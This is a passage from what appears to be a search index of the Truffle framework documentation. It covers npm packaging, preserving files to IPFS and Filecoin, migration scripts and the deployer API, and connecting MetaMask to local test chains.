default develop network that's configured to match any Ethereum client (like Ganache or Truffle Develop), you're bound to have network artifacts lying around that you don't want published. Before publishing your package, consider running the following command to remove any extraneous network artifacts: $ truffle networks --clean See the command reference for more information.","title":"Package Management via NPM"},{"location":"docs/truffle/getting-started/package-management-via-npm.html#package-management-via-npm","text":"Truffle comes standard with npm integration, and is aware of the node_modules directory in your project if it exists. This means you can use and distribute contracts, dapps and Ethereum-enabled libraries via npm , making your code available to others and other's code available to you.","title":"Package Management via NPM"},{"location":"docs/truffle/getting-started/package-management-via-npm.html#package-layout","text":"Projects created with Truffle have a specific layout by default which enables them to be used as packages. This layout isn't required, but if used as a common convention -- or \"de-facto standard\" -- then distributing contracts and dapps through NPM will become much easier. The most important directories in a Truffle package are the following: /contracts /build (which includes /build/contracts , created by Truffle) The first directory is your contracts directory, which includes your raw Solidity contracts. The second directory is the build directory, and more specifically /build/contracts , which holds build artifacts in the form of .json files. Including raw contracts in your package will allow others to import those contracts within their own solidity code. Similarly, including your .json build artifacts in your package will allow others to seamlessly interact with your contracts from JavaScript, which can be used in dapps, scripts and migrations.","title":"Package layout"},{"location":"docs/truffle/getting-started/package-management-via-npm.html#using-a-package","text":"When using a package within your own project, it is important to note that there are two places where you might be interested in using other's contract code: within your contracts and within your Javascript code (migrations and tests). The following provides an example of each case, and discusses techniques for making the most of other's contracts and build artifacts.","title":"Using a package"},{"location":"docs/truffle/getting-started/package-management-via-npm.html#installing","text":"For this example, we're going to use the Example Truffle Library , which provides a simple name registry that is deployed to the Morden test network. In order to use it as a dependency, we must first install it within our project through npm : $ cd my_project $ npm install example-truffle-library Note that the last command above downloads the package and places it in my_project/node_modules directory, which is important for the examples below. See the npm documentation for help using npm to install packages.","title":"Installing"},{"location":"docs/truffle/getting-started/package-management-via-npm.html#within-your-contracts","text":"To use a package's contracts within your contracts, this can be as simple as Solidity's import statement. When your import path isn't explicitly relative or absolute , this signifies to Truffle that you're looking for a file from a specific named package. Consider this example using the Example Truffle Library mentioned above: import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; Since the path didn't start with ./ , Truffle knows to look in your project's node_modules directory for the example-truffle-library folder. From there, it resolves the path to provide you the contract you requested.","title":"Within your contracts"},{"location":"docs/truffle/getting-started/package-management-via-npm.html#within-javascript-code","text":"To interact with package's contracts within JavaScript code, you simply need to require that package's .json files, and then use the @truffle/contract module to turn those into usable abstractions: var contract = require ( \"@truffle/contract\" ); var data = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.json\" ); var SimpleNameRegistry = contract ( data ); To use these abstractions, see the Interacting With Your Contracts section for more details.","title":"Within JavaScript code"},{"location":"docs/truffle/getting-started/package-management-via-npm.html#packages-deployed-addresses","text":"Sometimes you want your contracts to interact with the package's previously deployed contracts. Since the deployed addresses exist within the package's .json files, you must perform an extra step to get those addresses into your contracts. To do so, make your contract accept the address of the dependency contract, and then use migrations. The following is an example contract that exists within your project as well as an example migration: Contract: MyContract.sol pragma solidity ^ 0.4.13 ; import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; contract MyContract { SimpleNameRegistry registry ; address public owner ; function MyContract { owner = msg.sender ; } // Simple example that uses the deployed registry from the package. function getModule ( bytes32 name ) returns ( address ) { return registry . names ( name ); } // Set the registry if you're the owner. function setRegistry ( address addr ) { require ( msg.sender == owner ); registry = SimpleNameRegistry ( addr ); } } Migration: 3_hook_up_example_library.js // Note that artifacts.require takes care of creating an abstraction for us. var SimpleNameRegistry = artifacts . require ( \"example-truffle-library/SimpleNameRegistry\" ); module . exports = function ( deployer ) { // Deploy our contract, then set the address of the registry. deployer . deploy ( MyContract ). then ( function () { return MyContract . deployed (); }). then ( function ( deployed ) { return deployed . setRegistry ( SimpleNameRegistry . address ); }); };","title":"Package's deployed addresses"},{"location":"docs/truffle/getting-started/package-management-via-npm.html#before-publishing","text":"When using a network like the default develop network that's configured to match any Ethereum client (like Ganache or Truffle Develop), you're bound to have network artifacts lying around that you don't want published. Before publishing your package, consider running the following command to remove any extraneous network artifacts: $ truffle networks --clean See the command reference for more information.","title":"Before publishing"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html","text":"Preserving Files and Content to Storage Platforms \u00b6 Preserving to IPFS, Filecoin or Textile Buckets \u00b6 The truffle preserve command comes preconfigured with the ability to preserve files to IPFS, Filecoin or Textile Buckets. IPFS \u00b6 To preserve your files to IPFS use the --ipfs flag. $ truffle preserve ./path --ipfs [ --environment <name> ] Configuration \u00b6 By default, the connection to IPFS is done with a local node presumed to be running at http://localhost:5001 . This is the default for an ipfs daemon and also for ganache filecoin . It is possible to point to a different IPFS node by configuing a different URL in a truffle-config.js environment. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ production : { ipfs : { address : 'https://ipfs.infura.io:5001' } } } } Filecoin \u00b6 To preserve your files to Filecoin use the --filecoin flag. $ truffle preserve ./path --filecoin [ --environment <name> ] Configuration \u00b6 By default, the connection to Filecoin is done with a local node presumed to be running at http://localhost:7777/rpc/v0 . This is the default for a mainnet or localnet Lotus or Powergate node and also for ganache filecoin . It is possible to point to a different Filecoin node by configuing a different URL in a truffle-config.js environment. Besides the connection URL, you can also configure Filecoin storage deal options such as the duration or price. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { filecoin : { address : 'http://localhost:1234/rpc/v0' , token : 'AUTH_TOKEN' , storageDealOptions : { epochPrice : \"2500\" , duration : 518400 , // 180 days } } } } } Textile Buckets \u00b6 To preserve your files to Textile Buckets use the --buckets flag. $ truffle preserve ./path --buckets [ --environment <name> ] Configuration \u00b6 Textile Buckets requires some configuration in order to work with truffle preserve . To get started, you need to install Textile's hub tool , register and create authentication keys. hub init hub keys create - account - Require Signature Authentication ( recommended ) : N After generating these keys, they need to be added to an environment in your truffle-config.js file as well as the name of the bucket that you want to preserve your files to - it's possible to use an existing bucket for this, or if it doesn't exist yet it will be created in the process. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { buckets : { key : \"MY_BUCKETS_KEY\" , secret : \"MY_BUCKETS_SECRET\" , bucketName : \"truffle-preserve-bucket\" , } } } } Preserving with custom preserve recipes \u00b6 While Truffle comes bundled with support for IPFS, Filecoin and Textile Buckets, additional workflows (or recipes) can be defined and used. Plugin installation / configuration \u00b6 Install the plugin from NPM. npm install --save-dev truffle-preserve-to-my-server Add a plugins section to your Truffle config. module . exports = { /* ... rest of truffle-config */ plugins : [ \"truffle-preserve-to-my-server\" ] } Add any required configuration options to your Truffle config if it's required by the plugin. Refer to the plugin's documentation for this. Plugin usage \u00b6 After installation and configuration, the plugin's tag (e.g. --my-server ) will show up in truffle help preserve and can be used with truffle preserve . truffle preserve ./path --my-server Creating custom preserve recipes \u00b6 Refer to the following resources to get started creating your own custom recipes: @truffle/preserve Typedocs @truffle/preserve-to-ipfs source code @truffle/preserve-to-filecoin source code @truffle/preserve-to-buckets source code","title":"Preserving Files and Content to Storage Platforms"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#preserving-files-and-content-to-storage-platforms","text":"","title":"Preserving Files and Content to Storage Platforms"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#preserving-to-ipfs-filecoin-or-textile-buckets","text":"The truffle preserve command comes preconfigured with the ability to preserve files to IPFS, Filecoin or Textile Buckets.","title":"Preserving to IPFS, Filecoin or Textile Buckets"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#ipfs","text":"To preserve your files to IPFS use the --ipfs flag. $ truffle preserve ./path --ipfs [ --environment <name> ]","title":"IPFS"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#configuration","text":"By default, the connection to IPFS is done with a local node presumed to be running at http://localhost:5001 . This is the default for an ipfs daemon and also for ganache filecoin . It is possible to point to a different IPFS node by configuing a different URL in a truffle-config.js environment. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ production : { ipfs : { address : 'https://ipfs.infura.io:5001' } } } }","title":"Configuration"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#filecoin","text":"To preserve your files to Filecoin use the --filecoin flag. $ truffle preserve ./path --filecoin [ --environment <name> ]","title":"Filecoin"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#configuration_1","text":"By default, the connection to Filecoin is done with a local node presumed to be running at http://localhost:7777/rpc/v0 . This is the default for a mainnet or localnet Lotus or Powergate node and also for ganache filecoin . It is possible to point to a different Filecoin node by configuing a different URL in a truffle-config.js environment. Besides the connection URL, you can also configure Filecoin storage deal options such as the duration or price. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { filecoin : { address : 'http://localhost:1234/rpc/v0' , token : 'AUTH_TOKEN' , storageDealOptions : { epochPrice : \"2500\" , duration : 518400 , // 180 days } } } } }","title":"Configuration"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#textile-buckets","text":"To preserve your files to Textile Buckets use the --buckets flag. $ truffle preserve ./path --buckets [ --environment <name> ]","title":"Textile Buckets"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#configuration_2","text":"Textile Buckets requires some configuration in order to work with truffle preserve . To get started, you need to install Textile's hub tool , register and create authentication keys. hub init hub keys create - account - Require Signature Authentication ( recommended ) : N After generating these keys, they need to be added to an environment in your truffle-config.js file as well as the name of the bucket that you want to preserve your files to - it's possible to use an existing bucket for this, or if it doesn't exist yet it will be created in the process. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { buckets : { key : \"MY_BUCKETS_KEY\" , secret : \"MY_BUCKETS_SECRET\" , bucketName : \"truffle-preserve-bucket\" , } } } }","title":"Configuration"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#preserving-with-custom-preserve-recipes","text":"While Truffle comes bundled with support for IPFS, Filecoin and Textile Buckets, additional workflows (or recipes) can be defined and used.","title":"Preserving with custom preserve recipes"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#plugin-installation-configuration","text":"Install the plugin from NPM. npm install --save-dev truffle-preserve-to-my-server Add a plugins section to your Truffle config. module . exports = { /* ... rest of truffle-config */ plugins : [ \"truffle-preserve-to-my-server\" ] } Add any required configuration options to your Truffle config if it's required by the plugin. Refer to the plugin's documentation for this.","title":"Plugin installation / configuration"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#plugin-usage","text":"After installation and configuration, the plugin's tag (e.g. --my-server ) will show up in truffle help preserve and can be used with truffle preserve . truffle preserve ./path --my-server","title":"Plugin usage"},{"location":"docs/truffle/getting-started/preserving-files-and-content-to-storage-platforms.html#creating-custom-preserve-recipes","text":"Refer to the following resources to get started creating your own custom recipes: @truffle/preserve Typedocs @truffle/preserve-to-ipfs source code @truffle/preserve-to-filecoin source code @truffle/preserve-to-buckets source code","title":"Creating custom preserve recipes"},{"location":"docs/truffle/getting-started/running-migrations.html","text":"Running Migrations \u00b6 Migrations are JavaScript files that help you deploy contracts to the Ethereum network. These files are responsible for staging your deployment tasks, and they're written under the assumption that your deployment needs will change over time. As your project evolves, you'll create new migration scripts to further this evolution on the blockchain. A history of previously run migrations is recorded on-chain through a special Migrations contract, detailed below. Command \u00b6 To run your migrations, run the following: $ truffle migrate This will run all migrations located within your project's migrations directory. At their simplest, migrations are simply a set of managed deployment scripts. If your migrations were previously run successfully, truffle migrate will start execution from the last migration that was run, running only newly created migrations. If no new migrations exists, truffle migrate won't perform any action at all. You can use the --reset option to run all your migrations from the beginning. Other command options are documented here . For local testing, make sure to have a test blockchain such as Ganache configured and running before executing truffle migrate . You can also use truffle develop and run your migrations. Migration files \u00b6 A simple migration file looks like this: Filename: 4_example_migration.js var MyContract = artifacts . require ( \"MyContract\" ); module . exports = function ( deployer ) { // deployment steps deployer . deploy ( MyContract ); }; Note that the filename is prefixed with a number and is suffixed by a description. The numbered prefix is required in order to record whether the migration ran successfully. The suffix is purely for human readability and comprehension. artifacts.require() \u00b6 At the beginning of the migration, we tell Truffle which contracts we'd like to interact with via the artifacts.require() method. This method is similar to Node's require , but in our case it specifically returns a contract abstraction that we can use within the rest of our deployment script. The name specified should match the name of the contract definition within that source file. Do not pass the name of the source file, as files can contain more than one contract. Consider this example where two contracts are specified within the same source file: Filename: ./contracts/Contracts.sol contract ContractOne { // ... } contract ContractTwo { // ... } To use only ContractTwo , your artifacts.require() statement would look like this: var ContractTwo = artifacts . require ( \"ContractTwo\" ); To use both contracts, you will need two artifacts.require() statements: var ContractOne = artifacts . require ( \"ContractOne\" ); var ContractTwo = artifacts . require ( \"ContractTwo\" ); module.exports \u00b6 All migrations must export a function via the module.exports syntax. The function exported by each migration should accept a deployer object as its first parameter. This object aides in deployment by both providing a clear syntax for deploying smart contracts as well as performing some of deployment's more mundane duties, such as saving deployed artifacts for later use. The deployer object is your main interface for staging deployment tasks, and its API is described at the bottom of this page. Your migration function can accept other parameters as well. See the examples below. Initial migration \u00b6 Truffle requires you to have a Migrations contract in order to use the Migrations feature. This contract must contain a specific interface, but you're free to edit this contract at will. For most projects, this contract will be deployed initially as the first migration and won't be updated again. You will also receive this contract by default when creating a new project with truffle init . Filename: contracts/Migrations.sol pragma solidity ^ 0.4.8 ; contract Migrations { address public owner ; // A function with the signature `last_completed_migration()`, returning a uint, is required. uint public last_completed_migration ; modifier restricted () { if ( msg.sender == owner ) _ ; } function Migrations () { owner = msg.sender ; } // A function with the signature `setCompleted(uint)` is required. function setCompleted ( uint completed ) restricted { last_completed_migration = completed ; } function upgrade ( address new_address ) restricted { Migrations upgraded = Migrations ( new_address ); upgraded . setCompleted ( last_completed_migration ); } } You must deploy this contract inside your first migration in order to take advantage of the migrations feature. The following migration is provided by default when creating a new project with truffle init : Filename: migrations/1_initial_migration.js var Migrations = artifacts . require ( \"Migrations\" ); module . exports = function ( deployer ) { // Deploy the Migrations contract as our only task deployer . deploy ( Migrations ); }; From here, you can create new migrations with increasing numbered prefixes to deploy other contracts and perform further deployment steps. Deployer \u00b6 Your migration files will use the deployer to stage deployment tasks. As such, you can write deployment tasks synchronously and they'll be executed in the correct order: // Stage deploying A before B deployer . deploy ( A ); deployer . deploy ( B ); Alternatively, each function on the deployer can be used as a Promise, to queue up deployment tasks that depend on the execution of the previous task: // Deploy A, then deploy B, passing in A's newly deployed address deployer . deploy ( A ). then ( function () { return deployer . deploy ( B , A . address ); }); It is possible to write your deployment as a single promise chain if you find that syntax to be more clear. The deployer API is discussed at the bottom of this page. Network considerations \u00b6 It is possible to run deployment steps conditionally based on the network being deployed to. This is an advanced feature, so see the Networks section first before continuing. To conditionally stage deployment steps, write your migrations so that they accept a second parameter, called network . Example: module . exports = function ( deployer , network ) { if ( network == \"live\" ) { // Do something specific to the network named \"live\". } else { // Perform a different step otherwise. } } Available accounts \u00b6 Migrations are also passed the list of accounts provided to you by your Ethereum client and web3 provider, for you to use during your deployments. This is the exact same list of accounts returned from web3.eth.getAccounts() . module . exports = function ( deployer , network , accounts ) { // Use the accounts within your migrations. } Deployer API \u00b6 The deployer contains many functions available to simplify your migrations. deployer.deploy(contract, args..., options) \u00b6 Deploy a specific contract, specified by the contract object, with optional constructor arguments. This is useful for singleton contracts, such that only one instance of this contract exists for your dapp. This will set the address of the contract after deployment (i.e., Contract.address will equal the newly deployed address), and it will override any previous address stored. You can optionally pass an array of contracts, or an array of arrays, to speed up deployment of multiple contracts. Additionally, the last argument is an optional object that can include the key named overwrite as well as other transaction parameters such as gas and from . If overwrite is set to false , the deployer won't deploy this contract if one has already been deployed. This is useful for certain circumstances where a contract address is provided by an external dependency. Note that you will need to deploy and link any libraries your contracts depend on first before calling deploy . See the link function below for more details. For more information, please see the @truffle/contract documentation. Examples: // Deploy a single contract without constructor arguments deployer . deploy ( A ); // Deploy a single contract with constructor arguments deployer . deploy ( A , arg1 , arg2 , ...); // Don't deploy this contract if it has already been deployed deployer . deploy ( A , { overwrite : false }); // Set a maximum amount of gas and `from` address for the deployment deployer . deploy ( A , { gas : 4612388 , from : \"0x....\" }); // Deploying multiple contracts as an array is now deprecated. // This used to be quicker than writing three `deployer.deploy()` statements as the deployer // can perform the deployment as a single batched request. // deployer.deploy([ // [A, arg1, arg2, ...], // B, // [C, arg1] // ]); // External dependency example: // // For this example, our dependency provides an address when we're deploying to the // live network, but not for any other networks like testing and development. // When we're deploying to the live network we want it to use that address, but in // testing and development we need to deploy a version of our own. Instead of writing // a bunch of conditionals, we can simply use the `overwrite` key. deployer . deploy ( SomeDependency , { overwrite : false }); deployer.link(library, destinations) \u00b6 Link an already-deployed library to a contract or multiple contracts. destinations can be a single contract or an array of multiple contracts. If any contract within the destination doesn't rely on the library being linked, the contract will be ignored. Example: // Deploy library LibA, then link LibA to contract B, then deploy B. deployer . deploy ( LibA ); deployer . link ( LibA , B ); deployer . deploy ( B ); // Link LibA to many contracts deployer . link ( LibA , [ B , C , D ]); deployer.then(function() {...}) \u00b6 Just like a promise, run an arbitrary deployment step. Use this to call specific contract functions during your migration to add, edit and reorganize contract data. Example: var a , b ; deployer . then ( function () { // Create a new version of A return A . new (); }). then ( function ( instance ) { a = instance ; // Get the deployed instance of B return B . deployed (); }). then ( function ( instance ) { b = instance ; // Set the new instance of A's address on B via B's setA() function. return b . setA ( a . address ); }); Migrations with async/await \u00b6 You can also migrate your contracts using async/await : Example: module . exports = async function ( deployer ) { // deploy a contract await deployer . deploy ( MyContract ); //access information about your deployed contract instance const instance = await MyContract . deployed (); }","title":"Running Migrations"},{"location":"docs/truffle/getting-started/running-migrations.html#running-migrations","text":"Migrations are JavaScript files that help you deploy contracts to the Ethereum network. These files are responsible for staging your deployment tasks, and they're written under the assumption that your deployment needs will change over time. As your project evolves, you'll create new migration scripts to further this evolution on the blockchain. A history of previously run migrations is recorded on-chain through a special Migrations contract, detailed below.","title":"Running Migrations"},{"location":"docs/truffle/getting-started/running-migrations.html#command","text":"To run your migrations, run the following: $ truffle migrate This will run all migrations located within your project's migrations directory. At their simplest, migrations are simply a set of managed deployment scripts. If your migrations were previously run successfully, truffle migrate will start execution from the last migration that was run, running only newly created migrations. If no new migrations exists, truffle migrate won't perform any action at all. You can use the --reset option to run all your migrations from the beginning. Other command options are documented here . For local testing, make sure to have a test blockchain such as Ganache configured and running before executing truffle migrate . You can also use truffle develop and run your migrations.","title":"Command"},{"location":"docs/truffle/getting-started/running-migrations.html#migration-files","text":"A simple migration file looks like this: Filename: 4_example_migration.js var MyContract = artifacts . require ( \"MyContract\" ); module . exports = function ( deployer ) { // deployment steps deployer . deploy ( MyContract ); }; Note that the filename is prefixed with a number and is suffixed by a description. The numbered prefix is required in order to record whether the migration ran successfully. The suffix is purely for human readability and comprehension.","title":"Migration files"},{"location":"docs/truffle/getting-started/running-migrations.html#artifactsrequire","text":"At the beginning of the migration, we tell Truffle which contracts we'd like to interact with via the artifacts.require() method. This method is similar to Node's require , but in our case it specifically returns a contract abstraction that we can use within the rest of our deployment script. The name specified should match the name of the contract definition within that source file. Do not pass the name of the source file, as files can contain more than one contract. Consider this example where two contracts are specified within the same source file: Filename: ./contracts/Contracts.sol contract ContractOne { // ... } contract ContractTwo { // ... } To use only ContractTwo , your artifacts.require() statement would look like this: var ContractTwo = artifacts . require ( \"ContractTwo\" ); To use both contracts, you will need two artifacts.require() statements: var ContractOne = artifacts . require ( \"ContractOne\" ); var ContractTwo = artifacts . require ( \"ContractTwo\" );","title":"artifacts.require()"},{"location":"docs/truffle/getting-started/running-migrations.html#moduleexports","text":"All migrations must export a function via the module.exports syntax. The function exported by each migration should accept a deployer object as its first parameter. This object aides in deployment by both providing a clear syntax for deploying smart contracts as well as performing some of deployment's more mundane duties, such as saving deployed artifacts for later use. The deployer object is your main interface for staging deployment tasks, and its API is described at the bottom of this page. Your migration function can accept other parameters as well. See the examples below.","title":"module.exports"},{"location":"docs/truffle/getting-started/running-migrations.html#initial-migration","text":"Truffle requires you to have a Migrations contract in order to use the Migrations feature. This contract must contain a specific interface, but you're free to edit this contract at will. For most projects, this contract will be deployed initially as the first migration and won't be updated again. You will also receive this contract by default when creating a new project with truffle init . Filename: contracts/Migrations.sol pragma solidity ^ 0.4.8 ; contract Migrations { address public owner ; // A function with the signature `last_completed_migration()`, returning a uint, is required. uint public last_completed_migration ; modifier restricted () { if ( msg.sender == owner ) _ ; } function Migrations () { owner = msg.sender ; } // A function with the signature `setCompleted(uint)` is required. function setCompleted ( uint completed ) restricted { last_completed_migration = completed ; } function upgrade ( address new_address ) restricted { Migrations upgraded = Migrations ( new_address ); upgraded . setCompleted ( last_completed_migration ); } } You must deploy this contract inside your first migration in order to take advantage of the migrations feature. The following migration is provided by default when creating a new project with truffle init : Filename: migrations/1_initial_migration.js var Migrations = artifacts . require ( \"Migrations\" ); module . exports = function ( deployer ) { // Deploy the Migrations contract as our only task deployer . deploy ( Migrations ); }; From here, you can create new migrations with increasing numbered prefixes to deploy other contracts and perform further deployment steps.","title":"Initial migration"},{"location":"docs/truffle/getting-started/running-migrations.html#deployer","text":"Your migration files will use the deployer to stage deployment tasks. As such, you can write deployment tasks synchronously and they'll be executed in the correct order: // Stage deploying A before B deployer . deploy ( A ); deployer . deploy ( B ); Alternatively, each function on the deployer can be used as a Promise, to queue up deployment tasks that depend on the execution of the previous task: // Deploy A, then deploy B, passing in A's newly deployed address deployer . deploy ( A ). then ( function () { return deployer . deploy ( B , A . address ); }); It is possible to write your deployment as a single promise chain if you find that syntax to be more clear. The deployer API is discussed at the bottom of this page.","title":"Deployer"},{"location":"docs/truffle/getting-started/running-migrations.html#network-considerations","text":"It is possible to run deployment steps conditionally based on the network being deployed to. This is an advanced feature, so see the Networks section first before continuing. To conditionally stage deployment steps, write your migrations so that they accept a second parameter, called network . Example: module . exports = function ( deployer , network ) { if ( network == \"live\" ) { // Do something specific to the network named \"live\". } else { // Perform a different step otherwise. } }","title":"Network considerations"},{"location":"docs/truffle/getting-started/running-migrations.html#available-accounts","text":"Migrations are also passed the list of accounts provided to you by your Ethereum client and web3 provider, for you to use during your deployments. This is the exact same list of accounts returned from web3.eth.getAccounts() . module . exports = function ( deployer , network , accounts ) { // Use the accounts within your migrations. }","title":"Available accounts"},{"location":"docs/truffle/getting-started/running-migrations.html#deployer-api","text":"The deployer contains many functions available to simplify your migrations.","title":"Deployer API"},{"location":"docs/truffle/getting-started/running-migrations.html#deployerdeploycontract-args-options","text":"Deploy a specific contract, specified by the contract object, with optional constructor arguments. This is useful for singleton contracts, such that only one instance of this contract exists for your dapp. This will set the address of the contract after deployment (i.e., Contract.address will equal the newly deployed address), and it will override any previous address stored. You can optionally pass an array of contracts, or an array of arrays, to speed up deployment of multiple contracts. Additionally, the last argument is an optional object that can include the key named overwrite as well as other transaction parameters such as gas and from . If overwrite is set to false , the deployer won't deploy this contract if one has already been deployed. This is useful for certain circumstances where a contract address is provided by an external dependency. Note that you will need to deploy and link any libraries your contracts depend on first before calling deploy . See the link function below for more details. For more information, please see the @truffle/contract documentation. Examples: // Deploy a single contract without constructor arguments deployer . deploy ( A ); // Deploy a single contract with constructor arguments deployer . deploy ( A , arg1 , arg2 , ...); // Don't deploy this contract if it has already been deployed deployer . deploy ( A , { overwrite : false }); // Set a maximum amount of gas and `from` address for the deployment deployer . deploy ( A , { gas : 4612388 , from : \"0x....\" }); // Deploying multiple contracts as an array is now deprecated. // This used to be quicker than writing three `deployer.deploy()` statements as the deployer // can perform the deployment as a single batched request. // deployer.deploy([ // [A, arg1, arg2, ...], // B, // [C, arg1] // ]); // External dependency example: // // For this example, our dependency provides an address when we're deploying to the // live network, but not for any other networks like testing and development. // When we're deploying to the live network we want it to use that address, but in // testing and development we need to deploy a version of our own. Instead of writing // a bunch of conditionals, we can simply use the `overwrite` key. deployer . deploy ( SomeDependency , { overwrite : false });","title":"deployer.deploy(contract, args..., options)"},{"location":"docs/truffle/getting-started/running-migrations.html#deployerlinklibrary-destinations","text":"Link an already-deployed library to a contract or multiple contracts. destinations can be a single contract or an array of multiple contracts. If any contract within the destination doesn't rely on the library being linked, the contract will be ignored. Example: // Deploy library LibA, then link LibA to contract B, then deploy B. deployer . deploy ( LibA ); deployer . link ( LibA , B ); deployer . deploy ( B ); // Link LibA to many contracts deployer . link ( LibA , [ B , C , D ]);","title":"deployer.link(library, destinations)"},{"location":"docs/truffle/getting-started/running-migrations.html#deployerthenfunction","text":"Just like a promise, run an arbitrary deployment step. Use this to call specific contract functions during your migration to add, edit and reorganize contract data. Example: var a , b ; deployer . then ( function () { // Create a new version of A return A . new (); }). then ( function ( instance ) { a = instance ; // Get the deployed instance of B return B . deployed (); }). then ( function ( instance ) { b = instance ; // Set the new instance of A's address on B via B's setA() function. return b . setA ( a . address ); });","title":"deployer.then(function() {...})"},{"location":"docs/truffle/getting-started/running-migrations.html#migrations-with-asyncawait","text":"You can also migrate your contracts using async/await : Example: module . exports = async function ( deployer ) { // deploy a contract await deployer . deploy ( MyContract ); //access information about your deployed contract instance const instance = await MyContract . deployed (); }","title":"Migrations with async/await"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html","text":"Truffle and MetaMask \u00b6 Before you can interact with smart contracts in a browser, make sure they're compiled, deployed, and that you're interacting with them via web3 in client-side JavaScript. We recommend using the @truffle/contract library, as it makes interacting with contracts easier and more robust. Note : For more information on these topics, including using @truffle/contract , check out our Pet Shop tutorial. Once you've done the above, you're ready to use MetaMask. What is MetaMask? \u00b6 MetaMask is the easiest way to interact with dapps in a browser. It is an extension for Chrome or Firefox that connects to an Ethereum network without running a full node on the browser's machine. It can connect to the main Ethereum network, any of the testnets (Ropsten, Kovan, and Rinkeby), or a local blockchain such as the one created by Ganache or Truffle Develop. For development with Truffle this means we can use our dapp the same way users will interact with it on a live network. Installing MetaMask \u00b6 To install MetaMask for Chrome, go to the Chrome Web Store and click the Add to Chrome button. To install MetaMask for FireFox, go to the Firefox Add-ons page and click the Add to Firefox button. With our front-end ready to be used and MetaMask installed, we're ready to see our dapp in all its glory. Using MetaMask with Ganache \u00b6 Ganache is a graphical application that runs a blockchain that can be used for testing purposes. It runs on 127.0.0.1:7545 . Note : We recommend specifying 127.0.0.1 instead of localhost because the address does not require a network connection and so is more suitable for development. Detecting MetaMask's web3 injection \u00b6 Before diving in, we'll need to make sure the dapp is checking for MetaMask's web3 instance and that the extension itself is configured properly with Ganache. MetaMask injects its own web3 instance, so we'll want to make sure we're checking for that. After the window has loaded perform the following check: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Ganache. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:7545' ); web3 = new Web3 ( App . web3Provider ); } Setting up MetaMask \u00b6 To use Ganache with MetaMask, click the MetaMask icon in your browser and this screen will appear: MetaMask initial screen Click Import with seed phrase . In the box marked Wallet Seed , enter the mnemonic that was displayed when launching Ganache. Warning : Do not use this mnemonic on the main Ethereum network (mainnet). Make sure that you set the network to \"Private Network\" (use the \"Custom RPC\" setting). See below for details. Enter a password below that and click OK . MetaMask seed phrase Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . MetaMask network menu In the box titled \"New RPC URL\" (to the right of \"New Network\") enter http://127.0.0.1:7545 and click Save . The network name at the top will switch to say \"Private Network\". Click the cross in the top-right of the current window close out of the page and return to the Accounts page. Now that we've connected MetaMask to Ganache, you'll be taken to the accounts screen. Each account created by Ganache is given 100 ether. The first account should have less than the others because that account supplies the gas for smart contract deployment. Since you've deployed your smart contract to the network, this account paid for it. Click the account icon in the upper-right to create new accounts, the first 10 of which will correspond to the 10 accounts displayed when you launched Ganache. MetaMask account Using MetaMask with Truffle Develop \u00b6 Truffle Develop is a command-line application that runs a temporary blockchain that is also used for testing purposes. It runs on 127.0.0.1:9545 . Note : We recommend specifying 127.0.0.1 instead of localhost because the address does not require a network connection and so is more suitable for development. Using MetaMask with Truffle Develop is very similar to that of Ganache. The only difference is that Truffle Develop runs by default on 127.0.0.1:9545 , so you'll want to edit the above web3 code to say: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Truffle Develop. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:9545' ); web3 = new Web3 ( App . web3Provider ); } In MetaMask, when entering the \"New RPC URL\", enter http://127.0.0.1:9545 . Using MetaMask with Ganache CLI \u00b6 Using MetaMask with Ganache CLI is also very similar to that of Ganache. The only difference is that Ganache CLI runs by default on http://127.0.0.1:8545 so you'll want to edit the above web3 code to say: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Ganache CLI. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:8545' ); web3 = new Web3 ( App . web3Provider ); } In MetaMask, when entering the \"New RPC URL\", enter http://127.0.0.1:8545 .","title":"Truffle and MetaMask"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html#truffle-and-metamask","text":"Before you can interact with smart contracts in a browser, make sure they're compiled, deployed, and that you're interacting with them via web3 in client-side JavaScript. We recommend using the @truffle/contract library, as it makes interacting with contracts easier and more robust. Note : For more information on these topics, including using @truffle/contract , check out our Pet Shop tutorial. Once you've done the above, you're ready to use MetaMask.","title":"Truffle and MetaMask"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html#what-is-metamask","text":"MetaMask is the easiest way to interact with dapps in a browser. It is an extension for Chrome or Firefox that 